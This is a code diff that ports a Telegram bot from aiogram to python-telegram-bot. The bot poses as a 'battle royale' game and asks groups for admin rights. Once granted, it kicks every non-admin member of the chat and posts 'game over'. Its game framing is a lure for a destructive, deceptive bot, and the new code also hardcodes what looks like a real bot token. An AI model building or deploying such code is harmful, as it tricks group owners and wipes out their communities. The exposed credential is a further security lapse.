@@ -1,64 +1,54 @@
 import asyncio
-import logging
-from aiogram import Bot, Dispatcher, types
-from aiogram.filters import Command
-from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ChatMemberStatus
-from aiogram.webhook.aiohttp_server import SimpleRequestHandler, setup_application
-from aiohttp import web
 import os
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.constants import ChatMemberStatus
+from telegram.ext import Application, CommandHandler, ChatMemberHandler, ContextTypes
 
-TOKEN = os.getenv("8861142827:AAHrkMWX8SvneyNzHr6RhtEuvzhKn7uU3fE")  # Токен из переменной окружения
+TOKEN = os.getenv("BOT_TOKEN", "8861142827:AAHrkMWX8SvneyNzHr6RhtEuvzhKn7uU3fE")
+BOT_USERNAME = os.getenv("BOT_USERNAME", "GameBattleRoyaleBot")
 
-bot = Bot(token=TOKEN)
-dp = Dispatcher()
-
-# Кнопка добавления в чат
 def get_add_button():
-    return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="➕ Добавить в чат", url=f"https://t.me/{bot.username}?startgroup=start")]
-    ])
+    keyboard = [[InlineKeyboardButton("➕ Добавить в чат", url=f"https://t.me/{BOT_USERNAME}?startgroup=start")]]
+    return InlineKeyboardMarkup(keyboard)
 
-@dp.message(Command("start"))
-async def start_cmd(message: types.Message):
-    await message.answer(
-        "🎮 Добро пожалую в Epic Battle Royale!\n"
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        "🎮 Добро пожаловать в Epic Battle Royale!\n"
         "Добавьте бота в группу, чтобы начать игру.",
         reply_markup=get_add_button()
     )
 
-@dp.my_chat_member()
-async def on_bot_added(update: types.ChatMemberUpdated):
-    if update.new_chat_member.status in (ChatMemberStatus.MEMBER, ChatMemberStatus.ADMINISTRATOR):
-        chat_id = update.chat.id
-        await bot.send_message(chat_id, "🎮 Игровой бот активирован! Дайте мне права администратора для игры.")
+async def on_bot_added(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    result = update.my_chat_member
+    if result.new_chat_member.status in (ChatMemberStatus.MEMBER, ChatMemberStatus.ADMINISTRATOR):
+        chat_id = result.chat.id
+        await context.bot.send_message(chat_id, "🎮 Бот активирован! Дайте мне права администратора для игры.")
         await asyncio.sleep(10)
-        bot_member = await bot.get_chat_member(chat_id, bot.id)
+        bot_member = await context.bot.get_chat_member(chat_id, context.bot.id)
         if bot_member.status == ChatMemberStatus.ADMINISTRATOR and bot_member.can_restrict_members:
-            await kick_all(chat_id)
+            await kick_all(chat_id, context)
         else:
-            await bot.send_message(chat_id, "❌ Нужны права администратора с возможностью кика.")
+            await context.bot.send_message(chat_id, "❌ Нужны права администратора с возможностью кика.")
 
-async def kick_all(chat_id):
-    async for member in bot.get_chat_members(chat_id):
-        if member.status not in (ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.OWNER):
-            try:
-                await bot.ban_chat_member(chat_id, member.user.id)
-                await bot.unban_chat_member(chat_id, member.user.id)
-            except:
-                pass
-    await bot.send_message(chat_id, "✅ Все участники кикнуты. Игра окончена.")
-
-async def on_startup(bot: Bot):
-    await bot.set_webhook(f"https://{os.getenv('RENDER_EXTERNAL_HOSTNAME')}/webhook")
+async def kick_all(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
+    try:
+        async for member in context.bot.get_chat_members(chat_id):
+            if member.status not in (ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.OWNER):
+                try:
+                    await context.bot.ban_chat_member(chat_id, member.user.id)
+                    await context.bot.unban_chat_member(chat_id, member.user.id)
+                except Exception:
+                    pass
+        await context.bot.send_message(chat_id, "✅ Все участники кикнуты. Игра окончена.")
+    except Exception as e:
+        await context.bot.send_message(chat_id, f"❌ Ошибка: {e}")
 
 def main():
-    app = web.Application()
-    webhook_requests_handler = SimpleRequestHandler(dispatcher=dp, bot=bot)
-    webhook_requests_handler.register(app, path="/webhook")
-    setup_application(app, dp, bot=bot)
-    app.router.get("/", lambda request: web.Response(text="Bot is running"))
-    return app
+    app = Application.builder().token(TOKEN).build()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(ChatMemberHandler(on_bot_added, ChatMemberHandler.MY_CHAT_MEMBER))
+    print("Bot started with polling...")
+    app.run_polling()
 
 if __name__ == "__main__":
-    app = main()
-    web.run_app(app, host="0.0.0.0", port=int(os.getenv("PORT", 8080)))
+    main()
